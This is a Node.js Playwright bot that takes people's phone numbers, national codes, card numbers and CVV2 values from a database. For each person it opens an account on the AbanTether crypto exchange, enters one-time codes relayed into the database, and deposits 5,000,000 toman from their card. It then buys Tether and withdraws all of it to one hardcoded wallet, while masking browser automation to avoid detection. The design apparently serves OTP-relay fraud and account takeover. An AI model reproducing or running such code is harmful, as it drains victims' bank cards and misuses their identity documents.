const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
const fs = require('fs').promises;
const path = require('path');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI);
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.screenshotsDir = './screenshots';
        this.password = 'Aban@1404T'; // رمز ثابت برای همه کاربران
    }

    async log(step, message) {
        const timestamp = new Date().toISOString();
        const logMessage = `[${timestamp}] [${step}] ${message}`;
        console.log(logMessage);
        await fs.appendFile('bot.log', logMessage + '\n');
    }

    async saveScreenshot(name) {
        try {
            await fs.mkdir(this.screenshotsDir, { recursive: true });
            const filepath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: filepath, fullPage: true });
            this.log('SCREENSHOT', `Saved: ${filepath}`);
        } catch (error) {
            this.log('ERROR', `Screenshot error: ${error.message}`);
        }
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME);
            this.collection = this.db.collection(process.env.COLLECTION_NAME);
            this.log('DATABASE', '✅ Connected to MongoDB');
        } catch (error) {
            this.log('ERROR', `Database connection failed: ${error.message}`);
            throw error;
        }
    }

    async checkDatabase() {
        try {
            this.log('DATABASE', '🔍 Checking for pending users...');
            
            const users = await this.collection.find({
                processed: { $ne: true },
                personalPhoneNumber: { $ne: "", $exists: true }
            }).toArray();

            this.log('DATABASE', `Found ${users.length} users with phone numbers`);

            for (const user of users) {
                const phone = user.personalPhoneNumber;
                
                if (phone && !this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `🚀 Starting processing for: ${phone}`);
                    this.processingUsers.add(phone);
                    
                    this.processUser(user).catch(async (error) => {
                        this.log('ERROR', `Failed for ${phone}: ${error.message}`);
                        this.processingUsers.delete(phone);
                        await this.updateUserStatus(phone, 'failed', error.message);
                    });
                }
            }
        } catch (error) {
            this.log('ERROR', `Database check error: ${error.message}`);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        
        try {
            this.log('PROCESS', `🔄 Processing user: ${phone}`);
            await this.updateUserStatus(phone, 'starting', 'Process started');
            
            // Step 1: Initialize browser
            await this.updateUserStatus(phone, 'initializing_browser', 'Launching browser');
            await this.initializeBrowser();
            
            // Step 2: Enter phone number and wait for OTP
            await this.updateUserStatus(phone, 'entering_phone', 'Entering phone number');
            await this.enterPhoneNumber(user);
            
            await this.updateUserStatus(phone, 'waiting_login_otp', 'Waiting for login OTP');
            const loginOTP = await this.waitForField(phone, 'otp_login');
            await this.loginWithOTP(user, loginOTP);
            
            // Step 3: Set password
            await this.updateUserStatus(phone, 'setting_password', 'Setting account password');
            await this.setPassword();
            
            // Step 4: Complete basic KYC
            await this.updateUserStatus(phone, 'completing_basic_kyc', 'Completing basic KYC');
            await this.completeBasicKYC(user);
            
            // Step 5: Register bank card
            await this.updateUserStatus(phone, 'adding_card', 'Adding bank card');
            await this.addCard(user);
            
            await this.updateUserStatus(phone, 'waiting_card_otp', 'Waiting for card OTP');
            const cardOTP = await this.waitForField(phone, 'otp_register_card');
            await this.registerCardWithOTP(cardOTP);
            
            // Step 6: Deposit money
            await this.updateUserStatus(phone, 'initiating_payment', 'Initiating payment');
            await this.initiatePayment();
            
            await this.updateUserStatus(phone, 'waiting_payment_otp', 'Waiting for payment OTP');
            const paymentOTP = await this.waitForField(phone, 'otp_payment');
            await this.completePayment(paymentOTP);
            
            // Step 7: Buy Tether
            await this.updateUserStatus(phone, 'buying_tether', 'Buying Tether');
            await this.buyTether();
            
            // Step 8: Withdraw Tether
            await this.updateUserStatus(phone, 'withdrawing', 'Withdrawing Tether');
            await this.withdrawTether();
            
            // Complete
            await this.updateUserStatus(phone, 'completed', 'Process completed successfully');
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `✅ Successfully completed for: ${phone}`);
            
        } catch (error) {
            this.log('ERROR', `❌ Process failed for ${phone}: ${error.message}`);
            await this.updateUserStatus(phone, 'failed', error.message);
            throw error;
        } finally {
            this.processingUsers.delete(phone);
            await this.closeBrowser();
        }
    }

    async waitForField(phone, fieldName, timeout = 300000) {
        this.log('WAIT', `⏳ Waiting for ${fieldName}...`);
        
        const startTime = Date.now();
        const checkInterval = 3000;
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const otp = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} received: ${otp}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return otp;
                }
                
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                if (elapsed % 10 === 0) {
                    this.log('WAIT', `⏳ Still waiting for ${fieldName}... (${elapsed}s passed)`);
                }
                
                await this.sleep(checkInterval);
                
            } catch (error) {
                this.log('ERROR', `Error checking ${fieldName}: ${error.message}`);
                await this.sleep(checkInterval);
            }
        }
        
        throw new Error(`Timeout: No ${fieldName} received after ${timeout/1000} seconds`);
    }

    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 Initializing browser...');
            
            this.browser = await chromium.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1280,720'
                ]
            });
            
            const context = await this.browser.newContext({
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: { width: 1280, height: 720 },
                locale: 'fa-IR'
            });
            
            await context.addInitScript(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
            });
            
            this.page = await context.newPage();
            
            this.log('BROWSER', '✅ Browser initialized');
            
        } catch (error) {
            this.log('ERROR', `Browser init failed: ${error.message}`);
            throw error;
        }
    }

    async enterPhoneNumber(user) {
        try {
            this.log('PHONE', `📱 Starting registration for: ${user.personalPhoneNumber}`);
            
            // Go to main page
            await this.page.goto('https://abantether.com', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('01-main-page');
            
            // Click on ثبت‌نام button
            const registerButton = await this.page.$('button:has-text("ثبت‌نام"), a:has-text("ثبت‌نام")');
            
            if (registerButton) {
                await registerButton.click();
                this.log('PHONE', '✅ Clicked ثبت‌نام button');
            } else {
                // Try direct register URL
                await this.page.goto('https://abantether.com/register');
                this.log('PHONE', '✅ Went directly to register page');
            }
            
            await this.sleep(3000);
            await this.saveScreenshot('02-register-page');
            
            // Enter phone number
            const phoneInput = await this.page.$('input[type="tel"], input[name*="phone"], input[placeholder*="تلفن همراه"]');
            
            if (phoneInput) {
                await phoneInput.fill(user.personalPhoneNumber);
                this.log('PHONE', `✅ Phone number entered: ${user.personalPhoneNumber}`);
            } else {
                // Try all inputs
                const allInputs = await this.page.$$('input');
                for (const input of allInputs) {
                    const placeholder = await input.getAttribute('placeholder') || '';
                    if (placeholder.includes('تلفن') || placeholder.includes('موبایل') || placeholder.includes('شماره')) {
                        await input.fill(user.personalPhoneNumber);
                        this.log('PHONE', `✅ Phone entered via placeholder: ${placeholder}`);
                        break;
                    }
                }
            }
            
            await this.saveScreenshot('03-phone-filled');
            
            // Click ادامه button
            const continueButton = await this.page.$('button:has-text("ادامه"), button:has-text("مرحله بعد")');
            
            if (continueButton) {
                await continueButton.click();
                this.log('PHONE', '✅ Continue button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('PHONE', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('04-after-continue');
            
            // Check if OTP field appeared
            const otpField = await this.page.$('input[type="number"], input[placeholder*="کد تأیید"]');
            if (otpField) {
                this.log('PHONE', '✅ OTP field appeared - waiting for otp_login');
                this.log('PHONE', `📱 SMS should be sent to: ${user.personalPhoneNumber}`);
            } else {
                this.log('PHONE', '❌ OTP field not found');
                throw new Error('OTP field did not appear');
            }
            
        } catch (error) {
            this.log('ERROR', `Phone entry failed: ${error.message}`);
            await this.saveScreenshot('error-phone');
            throw error;
        }
    }

    async loginWithOTP(user, otp) {
        try {
            this.log('LOGIN', `🔑 Entering OTP: ${otp}`);
            
            // Enter OTP
            const otpInput = await this.page.$('input[type="number"], input[placeholder*="کد تأیید"]');
            
            if (otpInput) {
                await otpInput.fill(otp);
                this.log('LOGIN', `✅ OTP entered: ${otp}`);
            } else {
                throw new Error('OTP input not found');
            }
            
            await this.saveScreenshot('05-otp-entered');
            
            // Click تأیید button
            const confirmButton = await this.page.$('button:has-text("تأیید"), button:has-text("تایید")');
            
            if (confirmButton) {
                await confirmButton.click();
                this.log('LOGIN', '✅ Confirm button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('LOGIN', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('06-after-confirm');
            
        } catch (error) {
            this.log('ERROR', `Login failed: ${error.message}`);
            await this.saveScreenshot('error-login');
            throw error;
        }
    }

    async setPassword() {
        try {
            this.log('PASSWORD', '🔐 Setting password...');
            
            await this.sleep(3000);
            await this.saveScreenshot('07-password-page');
            
            // Check if we're on password page
            const pageContent = await this.page.content();
            
            if (pageContent.includes('رمز عبور') || pageContent.includes('گذرواژه')) {
                // Find password fields
                const passwordInputs = await this.page.$$('input[type="password"]');
                
                if (passwordInputs.length >= 2) {
                    // Enter password
                    await passwordInputs[0].fill(this.password);
                    this.log('PASSWORD', `✅ Password entered: ${this.password}`);
                    
                    // Confirm password
                    await passwordInputs[1].fill(this.password);
                    this.log('PASSWORD', '✅ Confirm password entered');
                    
                    // Click تکمیل ثبت‌نام button
                    const completeButton = await this.page.$('button:has-text("تکمیل ثبت‌نام")');
                    
                    if (completeButton) {
                        await completeButton.click();
                        this.log('PASSWORD', '✅ Registration completed');
                    } else {
                        await this.page.keyboard.press('Enter');
                        this.log('PASSWORD', '✅ Pressed Enter');
                    }
                    
                    await this.sleep(5000);
                    await this.saveScreenshot('08-password-set');
                    
                } else {
                    throw new Error('Not enough password fields found');
                }
            } else {
                this.log('PASSWORD', '⚠️ Not on password page, might have skipped');
            }
            
        } catch (error) {
            this.log('ERROR', `Password setting failed: ${error.message}`);
            await this.saveScreenshot('error-password');
            throw error;
        }
    }

    async completeBasicKYC(user) {
        try {
            this.log('KYC', '📋 Completing basic KYC...');
            
            await this.sleep(3000);
            await this.saveScreenshot('09-kyc-page');
            
            // Enter national code
            if (user.personalNationalCode) {
                const nationalCodeInput = await this.page.$('input[placeholder*="کد ملی"]');
                
                if (nationalCodeInput) {
                    await nationalCodeInput.fill(user.personalNationalCode);
                    this.log('KYC', `✅ National code entered: ${user.personalNationalCode}`);
                }
            }
            
            // Enter birth date
            if (user.personalBirthDate) {
                const birthDateInput = await this.page.$('input[placeholder*="تاریخ تولد"]');
                
                if (birthDateInput) {
                    // Convert to Persian date if needed
                    await birthDateInput.fill(user.personalBirthDate);
                    this.log('KYC', `✅ Birth date entered: ${user.personalBirthDate}`);
                }
            }
            
            await this.saveScreenshot('10-kyc-filled');
            
            // Click تأیید اطلاعات button
            const confirmButton = await this.page.$('button:has-text("تأیید اطلاعات")');
            
            if (confirmButton) {
                await confirmButton.click();
                this.log('KYC', '✅ KYC information submitted');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('KYC', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('11-kyc-completed');
            
        } catch (error) {
            this.log('ERROR', `KYC failed: ${error.message}`);
            await this.saveScreenshot('error-kyc');
            throw error;
        }
    }

    async addCard(user) {
        try {
            this.log('CARD', '💳 Adding bank card...');
            
            // Go to wallet/banking page
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('12-wallet-page');
            
            // Look for اطلاعات حساب بانکی or کارت‌های من
            const bankingMenu = await this.page.$('a:has-text("اطلاعات حساب بانکی"), a:has-text("کارت‌های من")');
            
            if (bankingMenu) {
                await bankingMenu.click();
                this.log('CARD', '✅ Clicked banking menu');
                await this.sleep(3000);
            }
            
            await this.saveScreenshot('13-banking-page');
            
            // Click افزودن کارت جدید button
            const addCardButton = await this.page.$('button:has-text("افزودن کارت جدید")');
            
            if (addCardButton) {
                await addCardButton.click();
                this.log('CARD', '✅ Clicked add card button');
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('14-add-card-form');
            
            // Enter card number
            if (user.cardNumber) {
                const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"]');
                
                if (cardNumberInput) {
                    await cardNumberInput.fill(user.cardNumber);
                    this.log('CARD', `✅ Card number entered: ${user.cardNumber}`);
                }
            }
            
            await this.saveScreenshot('15-card-filled');
            
            // Click ثبت کارت button
            const registerCardButton = await this.page.$('button:has-text("ثبت کارت")');
            
            if (registerCardButton) {
                await registerCardButton.click();
                this.log('CARD', '✅ Card registration submitted');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('16-card-submitted');
            
            this.log('CARD', `📱 Waiting for otp_register_card...`);
            
        } catch (error) {
            this.log('ERROR', `Add card failed: ${error.message}`);
            await this.saveScreenshot('error-add-card');
            throw error;
        }
    }

    async registerCardWithOTP(otp) {
        try {
            this.log('CARD_OTP', `🔐 Entering card OTP: ${otp}`);
            
            // Enter OTP
            const otpInput = await this.page.$('input[type="number"], input[placeholder*="کد"]');
            
            if (otpInput) {
                await otpInput.fill(otp);
                this.log('CARD_OTP', `✅ Card OTP entered: ${otp}`);
            }
            
            await this.saveScreenshot('17-card-otp-entered');
            
            // Click تأیید button
            const confirmButton = await this.page.$('button:has-text("تأیید")');
            
            if (confirmButton) {
                await confirmButton.click();
                this.log('CARD_OTP', '✅ Card confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('18-card-registered');
            
        } catch (error) {
            this.log('ERROR', `Card registration failed: ${error.message}`);
            await this.saveScreenshot('error-card-otp');
            throw error;
        }
    }

    async initiatePayment() {
        try {
            this.log('PAYMENT', '💰 Initiating payment...');
            
            // Go to wallet page
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('19-wallet-for-payment');
            
            // Click واریز تومان button
            const depositButton = await this.page.$('button:has-text("واریز تومان"), a:has-text("واریز تومان")');
            
            if (depositButton) {
                await depositButton.click();
                this.log('PAYMENT', '✅ Clicked واریز تومان button');
                await this.sleep(3000);
            }
            
            await this.saveScreenshot('20-deposit-page');
            
            // Select واریز آنلاین (درگاه پرداخت)
            const onlinePayment = await this.page.$('button:has-text("واریز آنلاین"), div:has-text("درگاه پرداخت")');
            
            if (onlinePayment) {
                await onlinePayment.click();
                this.log('PAYMENT', '✅ Selected online payment');
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('21-payment-method');
            
            // Select card
            const cardSelection = await this.page.$('select, div:has-text("کارت")');
            if (cardSelection) {
                // Try to select first card
                await cardSelection.click();
                await this.sleep(1000);
                await this.page.keyboard.press('ArrowDown');
                await this.page.keyboard.press('Enter');
                this.log('PAYMENT', '✅ Card selected');
            }
            
            // Enter amount
            const amountInput = await this.page.$('input[placeholder*="مبلغ"], input[name*="amount"]');
            
            if (amountInput) {
                await amountInput.fill('5000000');
                this.log('PAYMENT', '✅ Amount entered: 5,000,000 تومان');
            }
            
            await this.saveScreenshot('22-amount-filled');
            
            // Click ایجاد درخواست واریز or پرداخت button
            const createRequestButton = await this.page.$('button:has-text("ایجاد درخواست"), button:has-text("پرداخت")');
            
            if (createRequestButton) {
                await createRequestButton.click();
                this.log('PAYMENT', '✅ Payment request created');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('23-payment-initiated');
            
            this.log('PAYMENT', '📱 Waiting for otp_payment...');
            
        } catch (error) {
            this.log('ERROR', `Payment initiation failed: ${error.message}`);
            await this.saveScreenshot('error-payment-init');
            throw error;
        }
    }

    async completePayment(otp) {
        try {
            this.log('PAYMENT_OTP', `💳 Completing payment with OTP: ${otp}`);
            
            // We should be on bank payment page
            await this.saveScreenshot('24-bank-page');
            
            // Enter CVV2
            const cvvInput = await this.page.$('input[placeholder*="CVV2"], input[name*="cvv"]');
            
            if (cvvInput) {
                // Need to get from database
                const user = await this.collection.findOne({ personalPhoneNumber: this.currentUser.personalPhoneNumber });
                if (user && user.cvv2) {
                    await cvvInput.fill(user.cvv2);
                    this.log('PAYMENT_OTP', `✅ CVV2 entered: ${user.cvv2}`);
                }
            }
            
            // Enter dynamic password (otp_payment)
            const passwordInput = await this.page.$('input[type="password"], input[placeholder*="رمز"]');
            
            if (passwordInput) {
                await passwordInput.fill(otp);
                this.log('PAYMENT_OTP', `✅ Payment OTP entered: ${otp}`);
            }
            
            await this.saveScreenshot('25-bank-info-filled');
            
            // Click پرداخت button
            const payButton = await this.page.$('button:has-text("پرداخت")');
            
            if (payButton) {
                await payButton.click();
                this.log('PAYMENT_OTP', '✅ Payment submitted to bank');
            }
            
            await this.sleep(10000); // Wait for bank processing
            await this.saveScreenshot('26-payment-completed');
            
        } catch (error) {
            this.log('ERROR', `Payment completion failed: ${error.message}`);
            await this.saveScreenshot('error-payment-complete');
            throw error;
        }
    }

    async buyTether() {
        try {
            this.log('BUY', '🛒 Buying Tether...');
            
            // Go to trading page
            await this.page.goto('https://abantether.com/market', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('27-market-page');
            
            // Make sure در تب خرید is active
            const buyTab = await this.page.$('button:has-text("خرید"), div:has-text("خرید")');
            
            if (buyTab) {
                await buyTab.click();
                this.log('BUY', '✅ Buy tab activated');
                await this.sleep(2000);
            }
            
            // Select تتر (USDT)
            const tetherOption = await this.page.$('div:has-text("تتر"), div:has-text("USDT")');
            
            if (tetherOption) {
                await tetherOption.click();
                this.log('BUY', '✅ Tether selected');
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('28-tether-selected');
            
            // Enter amount in تومان (all balance)
            const amountInput = await this.page.$('input[placeholder*="مبلغ تومان"]');
            
            if (amountInput) {
                // Select all balance
                const allBalanceButton = await this.page.$('button:has-text("همه موجودی")');
                
                if (allBalanceButton) {
                    await allBalanceButton.click();
                    this.log('BUY', '✅ All balance selected');
                } else {
                    // Enter max amount manually
                    await amountInput.fill('5000000');
                    this.log('BUY', '✅ Amount entered: 5,000,000 تومان');
                }
            }
            
            await this.saveScreenshot('29-amount-ready');
            
            // Click تأیید و خرید button
            const confirmBuyButton = await this.page.$('button:has-text("تایید و خرید"), button:has-text("تأیید و خرید")');
            
            if (confirmBuyButton) {
                await confirmBuyButton.click();
                this.log('BUY', '✅ Buy confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('30-buy-completed');
            
        } catch (error) {
            this.log('ERROR', `Buy Tether failed: ${error.message}`);
            await this.saveScreenshot('error-buy');
            throw error;
        }
    }

    async withdrawTether() {
        try {
            this.log('WITHDRAW', '🏦 Withdrawing Tether...');
            
            // Go to wallet page
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('31-wallet-for-withdraw');
            
            // Click برداشت رمزارز button
            const withdrawButton = await this.page.$('button:has-text("برداشت رمزارز"), a:has-text("برداشت رمزارز")');
            
            if (withdrawButton) {
                await withdrawButton.click();
                this.log('WITHDRAW', '✅ Clicked برداشت رمزارز button');
                await this.sleep(3000);
            }
            
            await this.saveScreenshot('32-withdraw-page');
            
            // Select تتر (USDT)
            const selectTether = await this.page.$('div:has-text("تتر"), div:has-text("USDT")');
            
            if (selectTether) {
                await selectTether.click();
                this.log('WITHDRAW', '✅ Tether selected for withdrawal');
                await this.sleep(2000);
            }
            
            // Select شبکه انتقال (TRC-20)
            const networkSelect = await this.page.$('select[name*="network"], div:has-text("شبکه انتقال")');
            
            if (networkSelect) {
                await networkSelect.click();
                await this.sleep(1000);
                
                // Select TRC-20
                const trc20Option = await this.page.$('option:has-text("TRC-20"), div:has-text("TRC-20")');
                if (trc20Option) {
                    await trc20Option.click();
                    this.log('WITHDRAW', '✅ TRC-20 network selected');
                }
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('33-network-selected');
            
            // Enter withdraw address
            const addressInput = await this.page.$('input[placeholder*="آدرس کیف پول"], textarea[placeholder*="آدرس"]');
            
            if (addressInput) {
                const withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
                await addressInput.fill(withdrawAddress);
                this.log('WITHDRAW', `✅ Withdraw address entered: ${withdrawAddress}`);
            }
            
            // Enter amount (all Tether)
            const amountInput = await this.page.$('input[placeholder*="مقدار برداشت"]');
            
            if (amountInput) {
                // Click همه موجودی if available
                const allTetherButton = await this.page.$('button:has-text("همه موجودی")');
                
                if (allTetherButton) {
                    await allTetherButton.click();
                    this.log('WITHDRAW', '✅ All Tether selected');
                }
            }
            
            await this.saveScreenshot('34-withdraw-ready');
            
            // Click ثبت درخواست برداشت button
            const submitButton = await this.page.$('button:has-text("ثبت درخواست برداشت")');
            
            if (submitButton) {
                await submitButton.click();
                this.log('WITHDRAW', '✅ Withdrawal request submitted');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('35-withdraw-completed');
            
        } catch (error) {
            this.log('ERROR', `Withdraw failed: ${error.message}`);
            await this.saveScreenshot('error-withdraw');
            throw error;
        }
    }

    async updateUserStatus(phone, status, message) {
        try {
            const updateData = {
                status: status,
                statusMessage: message,
                lastUpdated: new Date()
            };
            
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { $set: updateData }
            );
            
            this.log('STATUS', `📊 ${phone}: ${status} - ${message}`);
            
        } catch (error) {
            this.log('ERROR', `Status update failed: ${error.message}`);
        }
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date()
                    }
                }
            );
            
            this.log('COMPLETE', `✅ Marked ${phone} as completed`);
            
        } catch (error) {
            this.log('ERROR', `Mark as completed failed: ${error.message}`);
        }
    }

    async closeBrowser() {
        try {
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
                this.log('BROWSER', '✅ Browser closed');
            }
        } catch (error) {
            this.log('ERROR', `Browser close failed: ${error.message}`);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        this.log('POLLING', '🔄 Starting database polling (every 30 seconds)');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `Polling error: ${error.message}`);
            }
        }, 30000);
        
        // Health check server
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'running',
                timestamp: new Date().toISOString(),
                processing: Array.from(this.processingUsers)
            }));
        });
        
        server.listen(8080, () => {
            this.log('SERVER', '🌐 Health check server running on port 8080');
        });
    }

    async start() {
        this.log('START', '🤖 AbanTether Bot Starting...');
        
        try {
            await this.connectToMongoDB();
            await this.startPolling();
        } catch (error) {
            this.log('ERROR', `Start failed: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start();

// هندل خطاها
process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT]', error);
});